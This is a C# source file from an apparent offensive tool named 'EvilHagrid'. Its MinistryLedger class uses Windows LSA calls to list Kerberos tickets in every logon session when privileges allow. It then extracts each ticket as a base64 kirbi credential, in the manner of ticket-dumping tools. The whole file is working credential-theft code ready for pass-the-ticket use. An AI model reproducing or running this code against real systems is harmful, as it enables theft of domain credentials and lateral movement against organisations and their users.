using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Text;
using EvilHagrid.Domain;

namespace EvilHagrid.Ministry;

internal sealed class MinistryLedger
{
    private const int KerbQueryTicketCacheExMessage       = 14;
    private const int KerbRetrieveEncodedTicketMessage    = 8;
    private const uint KerbRetrieveTicketUseCacheOnly     = 2;
    private const uint MaximumTicketCount                 = 100_000;

    // -------------------------------------------------------------------------
    // Public API
    // -------------------------------------------------------------------------

    /// <summary>
    /// Enumerates Kerberos tickets across all logon sessions (elevated) or the
    /// current session only (untrusted).  Each record carries the LUID so the
    /// caller can pass it to <see cref="RetrieveEncodedTickets"/>.
    /// </summary>
    public IReadOnlyList<ScrollRecord> ReadAllSessions(string? serviceFilter)
    {
        EnsureWindows();

        var (lsaHandle, trusted) = OpenLsaHandle();
        var packageBuffer = IntPtr.Zero;

        try
        {
            var packageId = LookupKerbPackage(lsaHandle, out packageBuffer);

            if (trusted)
            {
                var enumStatus = LsaEnumerateLogonSessions(out var count, out var luidArray);
                if (enumStatus == 0)
                {
                    try
                    {
                        return ReadAcrossSessions(lsaHandle, packageId, count, luidArray, serviceFilter);
                    }
                    finally
                    {
                        LsaFreeReturnBuffer(luidArray);
                    }
                }

                Console.Error.WriteLine(
                    $"[!] LsaEnumerateLogonSessions failed (0x{enumStatus:X8}); falling back to current session.");
            }

            // Untrusted or enumeration failed: current session only.
            var currentLuid = GetCurrentLuid();
            if (currentLuid.LowPart == 0 && currentLuid.HighPart == 0)
            {
                Console.Error.WriteLine(
                    "[!] Could not determine the current logon session LUID; triage will show 0x0.");
            }

            return QueryTicketsForSession(lsaHandle, packageId, default, serviceFilter)
                .Select(s => s with { LuidLow = currentLuid.LowPart, LuidHigh = currentLuid.HighPart })
                .ToList();
        }
        finally
        {
            if (packageBuffer != IntPtr.Zero) Marshal.FreeHGlobal(packageBuffer);
            if (lsaHandle != IntPtr.Zero)     _ = LsaDeregisterLogonProcess(lsaHandle);
        }
    }

    /// <summary>
    /// Retrieves the encoded KRB_CRED (kirbi) for each ticket belonging to the
    /// specified LUID, optionally filtered by service name.
    /// </summary>
    public IReadOnlyList<KirbiRecord> RetrieveEncodedTickets(
        uint luidLow, int luidHigh, string? serviceFilter)
    {
        EnsureWindows();

        var requestedLuid = new Luid { LowPart = luidLow, HighPart = luidHigh };
        var (lsaHandle, trusted) = OpenLsaHandle();
        var packageBuffer = IntPtr.Zero;

        try
        {
            var packageId = LookupKerbPackage(lsaHandle, out packageBuffer);

            // Untrusted handle must query with LUID {0,0} (current session).
            // Determine whether the requested LUID belongs to the current session.
            Luid outputLuid;
            if (trusted)
            {
                outputLuid = requestedLuid;
            }
            else
            {
                var currentLuid = GetCurrentLuid();
                var isCurrent = requestedLuid.LowPart == 0 && requestedLuid.HighPart == 0
                    || (currentLuid.LowPart == requestedLuid.LowPart
                        && currentLuid.HighPart == requestedLuid.HighPart);

                if (!isCurrent)
                {
                    Console.Error.WriteLine(
                        "[!] Insufficient privilege to retrieve tickets for another session; " +
                        "dumping the current session instead.");
                }

                // Use the requested LUID for display if it matches, otherwise the actual current one.
                outputLuid = isCurrent ? requestedLuid : currentLuid;
            }

            // Trusted path queries with the actual LUID; untrusted must use {0,0}.
            var callLuid = trusted ? outputLuid : default;

            var scrolls = QueryTicketsForSession(lsaHandle, packageId, callLuid, serviceFilter)
                .Select(s => s with { LuidLow = outputLuid.LowPart, LuidHigh = outputLuid.HighPart })
                .ToList()
                .AsReadOnly();

            var kirbis = new List<KirbiRecord>(scrolls.Count);
            foreach (var scroll in scrolls)
            {
                try
                {
                    var targetName = string.IsNullOrEmpty(scroll.ServiceRealm)
                        ? scroll.ServiceName
                        : $"{scroll.ServiceName}@{scroll.ServiceRealm}";

                    var kirbiBytes = RetrieveSingleEncodedTicket(
                        lsaHandle, packageId, callLuid, targetName);

                    kirbis.Add(new KirbiRecord(
                        scroll.LuidLow, scroll.LuidHigh,
                        scroll.ClientName, scroll.ClientRealm,
                        scroll.ServiceName, scroll.ServiceRealm,
                        scroll.StartTimeUtc, scroll.EndTimeUtc,
                        scroll.TicketFlags,
                        Convert.ToBase64String(kirbiBytes)));
                }
                catch (Exception ex) when (ex is Win32Exception or InvalidDataException
                                               or OverflowException or ArgumentException)
                {
                    // Skip tickets that cannot be retrieved (e.g. expired, access denied).
                }
            }

            return kirbis;
        }
        finally
        {
            if (packageBuffer != IntPtr.Zero) Marshal.FreeHGlobal(packageBuffer);
            if (lsaHandle != IntPtr.Zero)     _ = LsaDeregisterLogonProcess(lsaHandle);
        }
    }

    // -------------------------------------------------------------------------
    // Core helpers
    // -------------------------------------------------------------------------

    private static (IntPtr Handle, bool Trusted) OpenLsaHandle()
    {
        var nameBuffer = IntPtr.Zero;
        try
        {
            nameBuffer = Marshal.StringToHGlobalAnsi("EvilHagrid");
            var processName = new LsaString { Length = 10, MaximumLength = 11, Buffer = nameBuffer };
            var status = LsaRegisterLogonProcess(ref processName, out var handle, out _);
            if (status == 0)
                return (handle, true);
        }
        finally
        {
            if (nameBuffer != IntPtr.Zero) Marshal.FreeHGlobal(nameBuffer);
        }

        ThrowForNtStatus(LsaConnectUntrusted(out var untrustedHandle), "LsaConnectUntrusted");
        return (untrustedHandle, false);
    }

    private static uint LookupKerbPackage(IntPtr lsaHandle, out IntPtr packageBuffer)
    {
        packageBuffer = Marshal.StringToHGlobalAnsi("Kerberos");
        var packageName = new LsaString { Length = 8, MaximumLength = 9, Buffer = packageBuffer };
        ThrowForNtStatus(
            LsaLookupAuthenticationPackage(lsaHandle, ref packageName, out var id),
            "LsaLookupAuthenticationPackage");
        return id;
    }

    private static IReadOnlyList<ScrollRecord> ReadAcrossSessions(
        IntPtr lsaHandle, uint packageId,
        uint count, IntPtr luidArray,
        string? serviceFilter)
    {
        var luidSize = Marshal.SizeOf<Luid>();
        var scrolls  = new List<ScrollRecord>();

        for (var i = 0; i < count; i++)
        {
            var luid = Marshal.PtrToStructure<Luid>(IntPtr.Add(luidArray, i * luidSize));
            try
            {
                scrolls.AddRange(QueryTicketsForSession(lsaHandle, packageId, luid, serviceFilter));
            }
            catch
            {
                // Session may be inaccessible; skip silently.
            }
        }

        return scrolls;
    }

    private static IReadOnlyList<ScrollRecord> QueryTicketsForSession(
        IntPtr lsaHandle, uint packageId, Luid logonId, string? serviceFilter)
    {
        var request = new KerbQueryTicketCacheRequest
        {
            MessageType = KerbQueryTicketCacheExMessage,
            LogonId     = logonId
        };

        var requestSize   = Marshal.SizeOf<KerbQueryTicketCacheRequest>();
        var requestBuffer = Marshal.AllocHGlobal(requestSize);
        var responseBuffer = IntPtr.Zero;

        try
        {
            Marshal.StructureToPtr(request, requestBuffer, false);

            var callStatus = LsaCallAuthenticationPackage(
                lsaHandle, packageId,
                requestBuffer, (uint)requestSize,
                out responseBuffer, out var responseLength,
                out var protocolStatus);

            ThrowForNtStatus(callStatus,    "LsaCallAuthenticationPackage");
            ThrowForNtStatus(protocolStatus, "Kerberos package (query)");

            return ReadCacheResponse(responseBuffer, responseLength, logonId, serviceFilter);
        }
        finally
        {
            if (responseBuffer != IntPtr.Zero) _ = LsaFreeReturnBuffer(responseBuffer);
            Marshal.FreeHGlobal(requestBuffer);
        }
    }

    private static IReadOnlyList<ScrollRecord> ReadCacheResponse(
        IntPtr responseBuffer, uint responseLength, Luid luid, string? serviceFilter)
    {
        var headerSize = Marshal.SizeOf<KerbQueryTicketCacheResponse>();
        if (responseBuffer == IntPtr.Zero || responseLength < headerSize)
            throw new InvalidDataException("The Kerberos package returned an invalid response.");

        var response = Marshal.PtrToStructure<KerbQueryTicketCacheResponse>(responseBuffer);
        if (response.CountOfTickets > MaximumTicketCount)
            throw new InvalidDataException("The Kerberos package returned an unreasonable ticket count.");

        var itemSize       = Marshal.SizeOf<KerbTicketCacheInfoEx>();
        var requiredLength = checked((ulong)headerSize + (ulong)response.CountOfTickets * (ulong)itemSize);
        if (requiredLength > responseLength)
            throw new InvalidDataException("The Kerberos package returned a truncated ticket list.");

        var scrolls       = new List<ScrollRecord>((int)response.CountOfTickets);
        var ticketPointer = IntPtr.Add(responseBuffer, headerSize);

        for (var index = 0; index < response.CountOfTickets; index++)
        {
            var ticket   = Marshal.PtrToStructure<KerbTicketCacheInfoEx>(ticketPointer);
            ticketPointer = IntPtr.Add(ticketPointer, itemSize);

            var serviceName  = ReadUnicodeString(ticket.ServerName);
            var serviceRealm = ReadUnicodeString(ticket.ServerRealm);

            if (!MatchesFilter(serviceName, serviceRealm, serviceFilter))
                continue;

            scrolls.Add(new ScrollRecord(
                luid.LowPart, luid.HighPart,
                ReadUnicodeString(ticket.ClientName),
                ReadUnicodeString(ticket.ClientRealm),
                serviceName,
                serviceRealm,
                ReadFileTime(ticket.StartTime),
                ReadFileTime(ticket.EndTime),
                ReadFileTime(ticket.RenewTime),
                ticket.EncryptionType,
                NameEncryption(ticket.EncryptionType),
                $"0x{ticket.TicketFlags:X8}"));
        }

        return scrolls;
    }

    private static byte[] RetrieveSingleEncodedTicket(
        IntPtr lsaHandle, uint packageId, Luid logonId, string targetName)
    {
        var targetBytes  = Encoding.Unicode.GetBytes(targetName);
        var structSize   = Marshal.SizeOf<KerbRetrieveTktRequest>();
        var totalSize    = structSize + targetBytes.Length + 2; // +2 for Unicode null terminator
        var requestBuffer = Marshal.AllocHGlobal(totalSize);
        var responseBuffer = IntPtr.Zero;

        try
        {
            // Zero the entire allocation (covers struct padding and null terminator).
            for (var i = 0; i < totalSize; i++)
                Marshal.WriteByte(requestBuffer, i, 0);

            // Copy target name immediately after the struct.
            Marshal.Copy(targetBytes, 0, IntPtr.Add(requestBuffer, structSize), targetBytes.Length);

            // Buffer must be a relative offset from the start of the submit buffer —
            // LSASS receives the bytes over ALPC and resolves the offset in its own VA space.
            var request = new KerbRetrieveTktRequest
            {
                MessageType    = KerbRetrieveEncodedTicketMessage,
                LogonId        = logonId,
                TicketFlags    = 0,
                CacheOptions   = KerbRetrieveTicketUseCacheOnly,
                EncryptionType = 0,
                TargetName     = new UnicodeString
                {
                    Length        = (ushort)targetBytes.Length,
                    MaximumLength = (ushort)(targetBytes.Length + 2),
                    Buffer        = (IntPtr)structSize
                }
            };

            Marshal.StructureToPtr(request, requestBuffer, false);

            var callStatus = LsaCallAuthenticationPackage(
                lsaHandle, packageId,
                requestBuffer, (uint)totalSize,
                out responseBuffer, out _,
                out var protocolStatus);

            ThrowForNtStatus(callStatus,     "LsaCallAuthenticationPackage");
            ThrowForNtStatus(protocolStatus, "Kerberos package (retrieve)");

            var ticket = Marshal.PtrToStructure<KerbExternalTicket>(responseBuffer);
            if (ticket.EncodedTicketSize == 0 || ticket.EncodedTicket == IntPtr.Zero)
                throw new InvalidDataException("Kerberos returned an empty encoded ticket.");

            const uint MaxKirbiSize = 10 * 1024 * 1024; // 10 MB sanity cap
            if (ticket.EncodedTicketSize > MaxKirbiSize)
                throw new InvalidDataException(
                    $"Kerberos returned an unreasonable ticket size ({ticket.EncodedTicketSize} bytes).");

            var ticketSize = checked((int)ticket.EncodedTicketSize);
            var kirbiBytes = new byte[ticketSize];
            Marshal.Copy(ticket.EncodedTicket, kirbiBytes, 0, ticketSize);
            return kirbiBytes;
        }
        finally
        {
            if (responseBuffer != IntPtr.Zero) _ = LsaFreeReturnBuffer(responseBuffer);
            Marshal.FreeHGlobal(requestBuffer);
        }
    }

    // -------------------------------------------------------------------------
    // Utility helpers
    // -------------------------------------------------------------------------

    private static Luid GetCurrentLuid()
    {
        const uint TokenQuery        = 0x0008;
        const int  TokenStatisticsId = 10;

        if (!OpenProcessToken(GetCurrentProcess(), TokenQuery, out var hToken))
            return default;

        var buffer = IntPtr.Zero;
        try
        {
            var size = Marshal.SizeOf<TokenStatistics>();
            buffer = Marshal.AllocHGlobal(size);
            if (!GetTokenInformation(hToken, TokenStatisticsId, buffer, (uint)size, out _))
                return default;

            return Marshal.PtrToStructure<TokenStatistics>(buffer).AuthenticationId;
        }
        finally
        {
            if (buffer != IntPtr.Zero) Marshal.FreeHGlobal(buffer);
            CloseHandle(hToken);
        }
    }

    private static bool MatchesFilter(string serviceName, string serviceRealm, string? filter)
    {
        if (string.IsNullOrWhiteSpace(filter)) return true;
        return serviceName.Contains(filter,  StringComparison.OrdinalIgnoreCase) ||
               serviceRealm.Contains(filter, StringComparison.OrdinalIgnoreCase);
    }

    private static string ReadUnicodeString(UnicodeString value)
    {
        if (value.Buffer == IntPtr.Zero || value.Length == 0) return string.Empty;
        if ((value.Length & 1) != 0 || value.Length > value.MaximumLength)
            throw new InvalidDataException("The Kerberos package returned an invalid Unicode string.");
        return Marshal.PtrToStringUni(value.Buffer, value.Length / 2) ?? string.Empty;
    }

    private static DateTimeOffset? ReadFileTime(long value)
    {
        if (value <= 0) return null;
        try { return new DateTimeOffset(DateTime.FromFileTimeUtc(value)); }
        catch (ArgumentOutOfRangeException) { return null; }
    }

    private static string NameEncryption(int encryptionType) => encryptionType switch
    {
        17 => "AES128-CTS-HMAC-SHA1-96",
        18 => "AES256-CTS-HMAC-SHA1-96",
        23 => "RC4-HMAC",
        24 => "RC4-HMAC-EXP",
        _  => $"etype-{encryptionType}"
    };

    private static void ThrowForNtStatus(int status, string operation)
    {
        if (status == 0) return;
        var error = checked((int)LsaNtStatusToWinError(status));
        throw new Win32Exception(error, $"{operation} failed.");
    }

    private static void EnsureWindows()
    {
        if (!OperatingSystem.IsWindows())
            throw new PlatformNotSupportedException(
                "Kerberos cache inspection is available on Windows only; no action was performed.");
    }

    // -------------------------------------------------------------------------
    // Native structures
    // -------------------------------------------------------------------------

    [StructLayout(LayoutKind.Sequential)]
    private struct LsaString
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct UnicodeString
    {
        public ushort Length;
        public ushort MaximumLength;
        public IntPtr Buffer;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct Luid
    {
        public uint LowPart;
        public int  HighPart;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct SecHandle
    {
        public IntPtr Lower;
        public IntPtr Upper;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct KerbQueryTicketCacheRequest
    {
        public int  MessageType;
        public Luid LogonId;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct KerbQueryTicketCacheResponse
    {
        public int  MessageType;
        public uint CountOfTickets;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct KerbTicketCacheInfoEx
    {
        public UnicodeString ClientName;
        public UnicodeString ClientRealm;
        public UnicodeString ServerName;
        public UnicodeString ServerRealm;
        public long          StartTime;
        public long          EndTime;
        public long          RenewTime;
        public int           EncryptionType;
        public uint          TicketFlags;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct KerbRetrieveTktRequest
    {
        public int           MessageType;
        public Luid          LogonId;
        public UnicodeString TargetName;
        public uint          TicketFlags;
        public uint          CacheOptions;
        public int           EncryptionType;
        public SecHandle     CredentialsHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct KerbCryptoKey
    {
        public int    KeyType;
        public int    Length;
        public IntPtr Value;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct KerbExternalTicket
    {
        public IntPtr        ServiceName;
        public IntPtr        TargetName;
        public IntPtr        ClientName;
        public UnicodeString DomainName;
        public UnicodeString TargetDomainName;
        public UnicodeString AltTargetDomainName;
        public KerbCryptoKey SessionKey;
        public uint          TicketFlags;
        public uint          Flags;
        public long          KeyExpirationTime;
        public long          StartTime;
        public long          EndTime;
        public long          RenewUntil;
        public long          TimeSkew;
        public uint          EncodedTicketSize;
        public IntPtr        EncodedTicket;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct TokenStatistics
    {
        public Luid  TokenId;
        public Luid  AuthenticationId;
        public long  ExpirationTime;
        public uint  TokenType;
        public uint  ImpersonationLevel;
        public uint  DynamicCharged;
        public uint  DynamicAvailable;
        public uint  GroupCount;
        public uint  PrivilegeCount;
        public Luid  ModifiedId;
    }

    // -------------------------------------------------------------------------
    // P/Invoke declarations
    // -------------------------------------------------------------------------

    [DllImport("secur32.dll")]
    private static extern int LsaConnectUntrusted(out IntPtr lsaHandle);

    [DllImport("secur32.dll")]
    private static extern int LsaRegisterLogonProcess(
        ref LsaString logonProcessName,
        out IntPtr lsaHandle,
        out uint securityMode);

    [DllImport("secur32.dll")]
    private static extern int LsaLookupAuthenticationPackage(
        IntPtr lsaHandle,
        ref LsaString packageName,
        out uint authenticationPackage);

    [DllImport("secur32.dll")]
    private static extern int LsaCallAuthenticationPackage(
        IntPtr lsaHandle,
        uint authenticationPackage,
        IntPtr protocolSubmitBuffer,
        uint submitBufferLength,
        out IntPtr protocolReturnBuffer,
        out uint returnBufferLength,
        out int protocolStatus);

    [DllImport("secur32.dll")]
    private static extern int LsaFreeReturnBuffer(IntPtr buffer);

    [DllImport("secur32.dll")]
    private static extern int LsaDeregisterLogonProcess(IntPtr lsaHandle);

    [DllImport("secur32.dll")]
    private static extern int LsaEnumerateLogonSessions(out uint count, out IntPtr luidList);

    [DllImport("advapi32.dll")]
    private static extern uint LsaNtStatusToWinError(int status);

    [DllImport("advapi32.dll")]
    private static extern bool OpenProcessToken(
        IntPtr processHandle, uint desiredAccess, out IntPtr tokenHandle);

    [DllImport("advapi32.dll")]
    private static extern bool GetTokenInformation(
        IntPtr tokenHandle, int tokenInformationClass,
        IntPtr tokenInformation, uint tokenInformationLength,
        out uint returnLength);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll")]
    private static extern bool CloseHandle(IntPtr hObject);
}
